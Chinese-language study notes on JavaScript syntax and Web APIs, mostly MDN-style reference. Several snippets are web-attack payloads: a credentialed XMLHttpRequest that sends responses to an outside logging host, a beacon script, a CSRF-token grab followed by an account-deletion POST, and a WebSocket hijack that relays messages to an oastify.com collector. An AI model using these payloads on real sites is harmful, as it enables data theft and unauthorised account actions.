图书：
- https://eloquentjavascript.net/

使用 MDN 分类方式归档更新

## 变量

如果不包含 `var`、`let` 或 `const` 这样的关键字，您定义的任何变量都会被提升到全局作用域。这意味着作为全局作用域子对象的任何其他对象都能访问该变量。

所有缺少 `var`、`let` 或 `const` 的变量也会在浏览器中的 `window` 对象上添加一个指针

```js
// 全局变量
foo = 0;
// 函数级可变变量（定义后作用于全函数，而超越当前代码块）
var foo = 0;
// 块级变量
let foo = 0;
// 块级常量
const foo = 0;


// 变量直接调用
console.log(age);

// 全局变量通过 window 上的指针调用
console.log(window.age);
```

## 函数

在 JavaScript 中，函数是对象。这意味着它们可以使用上一节中的变量和标识符进行赋值和重新赋值。

```javascript
// 匿名函数
function() {};

// 全局声明的命名函数
a = function() {};

// 函数作用域命名函数
var a = function() {};

// 块级作用域命名函数
let a = function() {};

// 块级作用域命名函数，不可重新赋值
const a = function() {};

// 继承父级上下文的匿名函数
() => {};

// 立即调用函数表达式（IIFE）
(function() {})();
```

## 上下文

在函数之间共享上下文：

```javascript
// 创建一个带有 ageData 上下文的 getAge() 函数克隆
// 然后使用参数 'joe' 调用它
const getBoundAge = getAge.bind(ageData)('joe');

// 使用 ageData 上下文和参数 joe 调用 getAge()
const boundAge = getAge.call(ageData, 'joe');

// 使用 ageData 上下文和参数 joe 调用 getAge()
const boundAge = getAge.apply(ageData, ['joe']);
```

这三个函数 `bind`、`call` 和 `apply` 允许开发者将上下文从一个函数移到另一个函数。`call` 和 `apply` 的唯一区别是 `call` 接受参数列表，而 `apply` 接受参数数组。


另一个帮助程序员管理上下文的新增功能是箭头函数，也称为简写函数。该函数继承其父级的上下文，允许上下文从父函数共享到子函数，而无需显式 `call`/`apply` 或 `bind`：

```javascript
// 全局上下文，全局变量 garlic 为 false
this.garlic = false;

// soup 对象，对象属性 garlic 为 true
const soup = { garlic: true };

// 附加到 soup 对象的标准函数，使用 soup 对象的属性 soup.garlic
soup.hasGarlic1 = function() { console.log(this.garlic); } // true

// 附加到全局上下文的箭头函数，使用全局属性 windows.garlic
soup.hasGarlic2 = () => { console.log(this.garlic); } // false
```

## 原型继承

JavaScript 并不真正支持类，而是在 JavaScript 原型系统之上通过一些抽象来模拟类的功能。在原型继承系统中，如 JavaScript，创建的任何对象都有一个名为 `prototype` 的属性附加到它上面。`prototype` 属性附带一个 `constructor` 属性，指向拥有该原型的函数。这意味着任何对象都可以用来实例化新对象，因为构造函数指向包含原型的对象，而原型包含构造函数。

```javascript
const 原型 = function(参数) {
  this.参数 = 值;
  this.方法a = function() {
    return this.参数;
  };
};

const 原型对象 = new 原型(参数);
console.log(原型对象.方法a());
```

当在 JavaScript 中创建新对象时，还会创建一个单独的对象 `__proto__`。该对象指向在创建该对象时调用其构造函数的原型。

由于 JavaScript 中的所有对象默认都是可变的，对 `prototype` 属性的更改可以在运行时的任何时刻发生。

与更严格设计的继承模型不同，JS 继承树可以在运行时改变。

```js
const 原型对象 = new 原型(参数);
原型对象.方法b(); // 不存在的方法报错

Vehicle.prototype.原型对象 = function() {
  return 0;
};

原型对象.方法b(); // 动态添加的存在的方法
```

## 异步

Promise：对象在给定函数完成后调用下一个函数（调用链）

在异步对象的作用域内，使用回调函数 resolve, reject 分别指定正常（继续传递）与异常（触发 catch）的条件

```js
// resolve, reject 为 Promise 的正常/异常回调函数
const promise = new Promise((resolve, reject) => {
  函数a(function(参数a) {
    // 处理正常/异常状态
    if (参数a) { return resolve(参数a); }
    return reject();
  });
}).then((参数a) => {
  return new Promise((resolve, reject) => {
    函数b(参数a, function(参数b) {
      if (参数b) { return resolve(参数b); }
      return reject();
    });
  });
}).catch((err) => {
  // 接收异常状态
  console.log('an error occurred!');
});
```

`async` 异步修饰将函数转换为尚未兑现的 `Promise`，在其中使用 `await` 等待对应步骤实现

```javascript
const 函数对象 = async function() {
  let 参数a = await 函数a();
  let 参数b = await 函数b(参数a);
};

函数对象();
```

## 浏览器 DOM

DOM 是用于在现代 Web 浏览器中管理状态的层次化表示数据。`window` 对象是最顶层标准对象之一。

## ```atob()```与```btoa()``` 
[mdn文档](https://mdn.org.cn/en-US/docs/Web/API/Window/atob)：

```typescript
const routes: Routes = [
{
path: atob('c2NvcmUtYm9hcmQ='),
component: ScoreBoardComponent
}
]
```
    
> Window 接口的 atob() 方法解码使用 Base64 编码的数据字符串。使用 Window.btoa() 方法编码和传输可能导致通信问题的数据，然后传输它并使用 atob() 方法再次解码数据。

## 阻止当前页面及同源的其他页面修改本地 localStorage 的特定字段

如果仅在单个页面设置，需监测其他页面。
若对所有页面生效则只需第一段阻止本页面存储。

```javascript
const block_key = 'target_key';
window.localStorage.getItem(block_key)

const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
    if (key != block_key){
        originalSetItem.call(this, key, value);
    }
};

window.addEventListener('storage', (event) => {
    if (event.key == block_key && event.newValue != null){
        localStorage.removeItem(block_key);
    }
});
```
在当前页面，创建一个`localStorage.setItem`的包装函数，添加储存条件为储存字段非拦截字段。
`storage` 事件，在同源的其他页面存储操作完成时触发。
在当前页面添加存储事件监听器，当其他页面的存储事件触时清空拦截字段的值（清空后值为 `null`，添加条件判断避免死循环）。


## 选择所有编辑链接，将跳转替换为复制链接地址到粘贴板，并阻止跳转

```js
const edit_links = document.querySelectorAll("a.github-edit-link");

edit_links.forEach(link => {
    link.addEventListener('click', (event) => {
        console.log(event.currentTarget.href);
        navigator.clipboard.writeText(event.currentTarget.href);
        event.preventDefault();
    });
});
```


## XMLHttpRequest


```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://foo.net',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='//foo.net/log?data='+this.responseText;
};
```

## setInterval

setInterval方法用于按照指定的时间间隔重复调用函数或执行代码片段。

```js
<script>
(()=> {
  if (window.__hb1) return;
  window.__hb1 = 1;
  let i = 0;
  setInterval(async () => {
    i++;

    const img = new Image();
    img.src = "http://10.0.0.5:9999/ping?i=" + i + "&t=" + Date.now();
  }, 1000);
})();
</script>
```

## JSON


- `JSON.parse(jsonString)`
  将 JSON 字符串转换为对象

- `JSON.stringify(value, replacer, space)` 
    用于将 JavaScript 值（对象、数组、原始类型等）转换为 JSON 格式字符串

## URL

```js
// 将 URL 字符串设置为 URL 对象
const url = new URL(location);

// 从 URL 对象的搜索参数中访问 csrf 的值
const csrf = url.searchParams.get('csrf');
```



## 其他

在 `window` 全局作用域设置 `__` 双下划线自定义属性名，避免重复执行后续js代码。
自定义属性名初始为 undefined（假值）。
```js
if (window.__agent) return;
window.__agent = true;
```


- `encodeURIComponent()`
    对字符串进行 URI 编码


## 字符串

- `'A'.repeat(重复次数)`
  构造重复字符串

## fs - 文件系统

https://nodejs.org/api/fs.html

- `filehandle.createReadStream([options])`
  创建文件读取流

- `unlink(文件路径字符串)`
  删除文件

## 流

- `readable.pipe()` 
  添加可写属性到可读对象上，并切换到流模式

## 事件

- `.on(事件名称, 回调函数)`
  发生事件时执行预设函数

## csv-parser - csv 处理库

https://www.npmjs.com/package/csv-parser

```js
const csv = require('csv-parser')
const fs = require('fs')
const results = [];

fs.createReadStream('data.csv')
  .pipe(csv())
  .on('data', (data) => results.push(data))
  .on('end', () => {
    console.log(results);
    // [
    //   { NAME: 'Daffy Duck', AGE: '24' },
    //   { NAME: 'Bugs Bunny', AGE: '22' }
    // ]
  });
```






## Map

- `Map.prototype.get()` 防御型方法
  返回该 map 中的指定元素。不包含继承属性

## Set

- `Set.prototype.has()` 防御型方法
  返回一个布尔值来指示对应的值是否存在于该集合中。不包含继承属性

## JavaScript 参考

### 语句和声明

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements

- `debugger` 语句
  调用任何可用的调试功能，例如设置断点。如果没有调试功能可用，则此语句不会产生任何效果。

#### try...catch

`try...catch` 语句由一个 `try` 块和一个 `catch` 块或 `finally` 块（或两者皆有）组成。首先执行 `try` 块中的代码，如果它抛出异常，则将执行 `catch` 块中的代码。`finally` 块中的代码将在控制流退出整个结构之前始终被执行。

```js
try {
  tryStatements
} catch (exceptionVar) {
  catchStatements
} finally {
  finallyStatements
}
```

#### for...of

for...of 语句执行一个循环，该循环处理来自可迭代对象的值序列。

```js
for (variable of iterable)
  statement
```

#### for...in

`for...in` 语句迭代一个对象的**所有**可枚举字符串属性（除 `Symbol` 以外），包括继承的可枚举属性。

```js
for (variable in object)
  statement
```

### 模板字符串

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals

模板字面量是用反引号（`` ` ``）分隔的字面量，允许多行字符串、带嵌入表达式的字符串插值和一种叫带标签的模板的特殊结构。

模板字面量有时被非正式地叫作模板字符串，因为它们最常被用作字符串插值（通过替换占位符来创建字符串）。然而，带标签的模板字面量可能不会产生字符串——它可以与自定义标签函数一起使用，来对模板字面量的不同部分执行任何操作（常用载荷混淆手段）。

```js
`string text`

`string text line 1
 string text line 2`

`string text ${expression} string text`

tagFunction`string text ${expression} string text`
```

参数
- `string text`
  将成为模板字面量的一部分的字符串文本。几乎允许所有字符，包括换行符和其他空白字符。但是，除非使用了标签函数，否则无效的转义序列将导致语法错误。
- `expression`
  要插入当前位置的表达式，其值被转换为字符串或传递给 tagFunction。
- `tagFunction`
  如果指定，将使用模板字符串数组和替换表达式调用它，返回值将成为模板字面量的值。见`带标签的模板`。


### JavaScript 标准内置对象

#### parseInt()

`parseInt(string, radix)` 解析一个字符串并返回指定基数的十进制整数，`radix` 是 2-36 之间的整数，表示被解析字符串的基数。

#### unescape()

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/unescape

`unescape()` 函数计算一个新的字符串，将其中的十六进制转义序列替换为它们所代表的字符。转义序列可能是由 `escape()` 等函数引入的。

```js
unescape(str)
```

#### decodeURI()

`decodeURI()` 函数能解码由 `encodeURI` 创建或其他流程得到的统一资源标识符（URI）。

> 注意，部分字符不解码。如：`=`

#### String

- `String.prototype.split(separator[, limit])`
  接受一个模式，通过搜索模式将字符串分割成一个有序的子串列表，将这些子串放入一个数组，并返回该数组。

##### String.prototype.includes()

执行区分大小写的搜索，以确定是否可以在一个字符串中找到另一个字符串，返回布尔值

```js
includes(searchString)
includes(searchString, position)
```

参数
- `position` 可选
  在字符串中开始搜索 `searchString` 的位置。默认值为 0。

##### String.prototype.match()

`match()` 方法检索字符串与正则表达式进行匹配的结果。

```js
match(regexp)
```

返回值
- 一个 `Array`，其内容取决于全局标志 (`g`) 的存在与否，如果没有找到匹配项，则返回 `null`。

#### RegExp 

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp

对象用于将文本与一个模式匹配。

有两种方法可以创建一个 `RegExp` 对象：
- 字面量，由斜杠 (`/`) 包围而不是引号包围。
- 构造函数，由引号而不是斜杠包围。

```js
// 以下三种表达式都会创建相同的正则表达式：
/ab+c/i; //字面量形式
new RegExp("ab+c", "i"); // 首个参数为字符串模式的构造函数
new RegExp(/ab+c/, "i"); // 首个参数为常规字面量的构造函数
```

#### Error

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Error

当运行时错误产生时，`Error` 对象会被抛出。`Error` 对象也可用于用户自定义的异常的基础对象。

实例属性
- `Error.prototype.message`
  错误消息
- `Error.prototype.name`
  错误名称
- `Error.prototype.cause`
  表示导致当前错误被抛出的原因——通常是另一个错误。

#### Array

##### Array.prototype.push()

`push()` 方法将指定的元素添加到数组的末尾，并返回新的数组长度。

```js
push(element0, element1, /* … ,*/ elementN)
```

##### Array.prototype.join()

`join()` 方法将一个数组（或一个类数组对象）的所有元素连接成一个字符串并返回这个字符串，用逗号或指定的分隔符字符串分隔。

```js
join(separator)
```

```js
const a = ["Wind", "Water", "Fire"];
a.join(); // 'Wind,Water,Fire'
a.join(", "); // 'Wind, Water, Fire'
a.join(" + "); // 'Wind + Water + Fire'
a.join(""); // 'WindWaterFire'
```

##### Array.prototype.map()

创建一个新数组，这个新数组由原数组中的每个元素都调用一次提供的函数后的返回值组成。

```js
map(callbackFn, thisArg)
```

##### Array.prototype.shift()

从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。

##### Array.prototype.slice()

`slice()` 方法返回一个新的数组对象，这一对象是一个由 `start` 和 `end` 决定的原数组的浅拷贝（包括 `start`，不包括 `end`），其中 `start` 和 `end` 代表了数组元素的索引。原始数组不会被改变。

```js
slice()
slice(start)
slice(start, end)
```

返回值
- 一个含有被提取元素的新数组。

##### Array.prototype.reduce()

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce

`reduce()` 方法对数组中的每个元素按序执行一个提供的 `reducer` 回调函数，每一次运行 `reducer` 会将先前元素的计算结果作为参数传入，最后将其结果汇总为单个返回值。
- 即，并非对所有元素应用回调函数。而是计算累计值

第一次执行回调函数时，不存在“上一次的计算结果”。如果需要回调函数从数组索引为 0 的元素开始执行，则需要传递初始值。否则，数组索引为 0 的元素将被用作初始值，迭代器将从第二个元素开始执行（即从索引为 1 而不是 0 的位置开始）。

```js
reduce(callbackFn)
reduce(callbackFn, initialValue)
```

参数
- `callbackFn`
  为数组中每个元素执行的函数。该函数被调用时将传入以下参数：
  - `accumulator`
    上一次调用 `callbackFn` 的结果
  - `currentValue`
    当前元素的值。

返回值
- 使用“reducer”回调函数遍历整个数组后的结果。

#### Object

- `Object.defineProperty(obj, prop, descriptor)` 潜在攻击工具属性的防御型方法
  直接在一个对象上定义一个新属性，或修改其现有属性，并返回此对象。

- `Object.freeze()` 防御型静态方法
  使一个对象被冻结。冻结对象可以防止扩展，并使现有的属性不可写入和不可配置。（完全阻止）

- `Object.seal()` 防御型静态方法
  密封一个对象。密封一个对象会阻止其扩展并且使得现有属性不可配置。只要现有属性的值是可写的，它们仍然可以更改。（部分阻止）

- `Object.create()` 防御型静态方法
  以一个现有对象作为原型，创建一个新对象。

##### Object.entries()

返回一个数组，包含给定对象**自有**的可枚举字符串键属性的键值对。

```js
Object.entries(obj)
```

例
```js
// 将对象的名值对格式化为换行符分割的字符串
const res_str = Object.entries(window).map(([key, value]) => `${key}=${value}`).join('\n');
```

##### Object.keys()

`Object.keys()` 静态方法返回一个由给定对象**自身**的可枚举的字符串键属性名组成的数组。

```js
Object.keys(obj)
```

## Web API

https://developer.mozilla.org/zh-CN/docs/Web/API

### Navigator

https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator

`Navigator` 接口代表了用户代理的状态和身份，它允许脚本对其进行查询并注册自身以便执行某些活动。

可以通过 `window.navigator` 只读属性获取 `Navigator` 对象。

标准属性
- `Navigator.clipboard` 只读 安全上下文
  返回一个用于读写访问系统剪贴板内容的 Clipboard 对象。
- `Navigator.userAgent` 只读
  返回当前浏览器的用户代理。


### EventTarget

#### EventTarget.addEventListener()

将指定的监听器注册到 `EventTarget` 上，当该对象触发指定的事件时，指定的回调函数就会被执行。

```js
addEventListener(type, listener); // 最常用
addEventListener(type, listener, options);
addEventListener(type, listener, useCapture);
```

参数
- `type`
  表示监听事件类型的大小写敏感的字符串。
- `listener`
  当所监听的事件类型触发时，会接收到一个事件通知（实现了 `Event` 接口的对象）对象。`listener` 必须是一个实现了 `EventListener` 接口的对象，或者是一个函数。有关回调本身的详细信息，请参阅事件监听回调


### Document

创建元素并添加到 DOM

```js
const form = document.createElement('form');
form.method = 'post';
document.documentElement.append(form);
```

#### createElement()

Document 接口的 `createElement()` 方法用于创建一个具有指定 localName 的 HTMLElement。

如果 localName 无法被识别，该方法将创建一个 HTMLUnknownElement。

```js
createElement(localName)
createElement(localName, options)
```

参数
- `localName`
  一个指定要创建的元素类型的字符串。

返回值
- 新的 `Element`。

### Node

#### Node.appendChild

方法将一个节点附加到指定父节点的子节点列表的末尾处。如果将被插入的节点已经存在于当前文档的文档树中，那么 `appendChild()` 只会将它从原先的位置移动到新的位置

```js
appendChild(aChild)
```

参数
- `aChild`
  要追加给父节点（通常为一个元素）的节点。

> 注：若文档尚未加载完成，将产生异常。使用搭配事件监听器 `DOMContentLoaded` 

### History

- `back()` 方法
  使浏览器在会话历史中后退一页。

### console

https://developer.mozilla.org/zh-CN/docs/Web/API/console

- `console.trace()` 静态方法
  将堆栈追踪信息输出到控制台


### fetch

<https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch>

- `response.ok` 判断状态
```js
if (!response.ok) {
  if (response.status === 404) {
    console.log('请求的资源不存在');
  } else if (response.status === 500) {
    console.log('服务器内部错误');
  }
}

```

- `redirect: 'manual'`
  不追踪重定向

示例
```js
// 携带凭证，获取页面 csrf 令牌
fetch('/my-account', {credentials: 'include'})
    .then(response => response.text())
    .then(text => {
        console.log('text', text);
        // 使用 HTML DOM 解析响应文本
        const parser = new DOMParser();
        const doc = parser.parseFromString(text, 'text/html');
        // 使用浏览器开发者攻击的 JS 元素选择器快速定位元素，获取 csrf 令牌
        const csrf_token = doc.querySelector('#delete-account-form > input[type=hidden]').value;
        console.log('csrf_token', csrf_token);
        // 携带凭证，并发送 csrf 令牌
        fetch('/my-account/delete', {
            method: 'POST',
            mode: 'no-cors',
            credentials: 'include',
            body: new URLSearchParams({
                'csrf': csrf_token
            })
        });
    }); 
```

### Response —— 对一次请求的响应数据

https://developer.mozilla.org/zh-CN/docs/Web/API/Response

属性
- `Response.status` 只读
  包含 Response 的状态码（例如 200 表示成功）。
- `Response.statusText` 只读
  包含了与该 Response 状态码一致的状态信息（例如，OK 对应 200）。
- `Response.headers` 只读
  包含此 Response 所关联的 Headers 对象。


#### Response.text()

提供了一个可供读取的“返回流”（`Response stream`），并将它读取完。它返回一个包含 `String` 对象（也就是文本）的 `Promise` 对象，返回结果的编码永远是 UTF-8。

### Headers

Fetch API 的 Headers 接口对 HTTP 请求和响应头执行各种操作。这些操作包括检索，设置，添加和删除。

一个 Headers 对象具有关联的标头列表，它最初为空，由零个或多个键值对组成。

### WebSocket

https://developer.mozilla.org/en-US/docs/Web/API/WebSocket

- `WebSocket()` 构造函数
  返回一个 WebSocket 对象
  ```js
  new WebSocket(url)
  new WebSocket(url, protocols)
  ```
  - url
    必须使用以下方案之一：ws、wss、http 或 https，且不得包含 URL 片段

- `WebSocket.send()` 方法
  将需要通过 WebSocket 链接传输至服务器的数据排入队列

```js
let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");

newWebSocket.onopen = function(evt) {
    newWebSocket.send("READY");
}

newWebSocket.onmessage = function(evt) {
    var message = evt.data;

    fetch("https://id.oastify.com/ws", {
        method: "POST",
        mode: 'no-cors', 
        body: message
    });
};
```

### element

- `element.outerHTML` 属性
  获取描述元素（包括其后代）的序列化 HTML 片段。它也可以设置为用从给定字符串解析的节点替换元素。

- `element.innerHTML` 属性
  设置或获取 HTML 语法表示的元素的后代。

### URLSearchParams

https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams

- `URLSearchParams()` 构造函数
  创建并返回一个新的 URLSearchParams 对象。

- `URLSearchParams.toString()`
  返回查询参数组成的字符串，可直接使用在 URL 上。

### DOMParser

DOMParser 接口提供了从字符串解析 XML 或 HTML 源代码为 DOM Document 对象的能力。

构造函数
- `DOMParser()`
  创建一个新的 DOMParser 对象。

实例方法
- `parseFromString(input, mimeType)`
  解析包含 HTML 或 XML 的输入，并返回一个 Document 对象，该对象的 `contentType` 属性与 `mimeType` 参数匹配。

### HTMLIFrameElement

https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLIFrameElement

`HTMLIFrameElement` 接口提供了除 `HTMLElement` 之外的一些特殊属性和方法（当然也包括了继承自 `HTMLElement` 的部分）。这些方法用于操作内联 `frame` 元素的布局和展示。

属性
- `contentDocument`
  如果 `iframe` 及其父文档处于同源，则返回一个 `Document`（即嵌套浏览上下文中的活动文档），否则返回 `null`。

### Window

- `open(url, target, windowFeatures)` 方法
  用指定的名称 `name` 将指定的资源加载到新的或已存在的浏览上下文（标签、窗口或 iframe）中。
  - `target`
    一个不含空格的字符串，用于指定加载资源的浏览上下文的名称 `name`。

- `Window.parent` 属性
  对当前窗口或子框架的父窗口的引用。
  - 如果没有父窗口，那么它的 `parent` 属性会引用它自身。
  - 当一个窗口加载在 `<iframe>`、`<object>` 或` <frame>` 中时，它的父窗口是嵌套该窗口的元素所属的窗口。

- `Window.location`
  获取/设置 `window` 对象的位置，或当前的 URL。

- `Window.navigator` 只读属性
  返回一个 `Navigator` 对象的引用，可以用于请求运行当前代码的应用程序的相关信息。

## 表达式和运算符

### instanceof

`instanceof` 运算符用于检测构造函数的 `prototype` 属性是否出现在某个实例对象的原型链上。其返回值是一个布尔值。可以通过 `Symbol.hasInstance` 来自定义该运算符的行为。

## 数据类型和数据结构

https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Data_structures

### 原始值

除了 `Object` 以外，所有的类型都定义了不可变的、在语言最底层直接表示的值。我们将这些类型的值称为原始值。原始值是一种既非对象也无方法或属性的数据。

## 其他

- `setTimeout(函数, 时间)`
  延迟执行函数
- `setInterval(函数, 时间)`
  定时执行函数

- `require('模块名称')`
  导入模块

- 双 `!!` 运算符判断是否为已定义

- `top`
  顶层页面

- `tabindex`
  tabindexglobal 属性允许开发者使 HTML 元素可聚焦

- `/Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1]`
  对 cookie 应用正则表达式捕获组，并选择第一个匹配

- `(+val + '') === val`
  预期的数字型字符串，`+val`隐式类型转换到数字，`+ ''`再隐式类型转换到字符串。确保变量类型为数字型字符串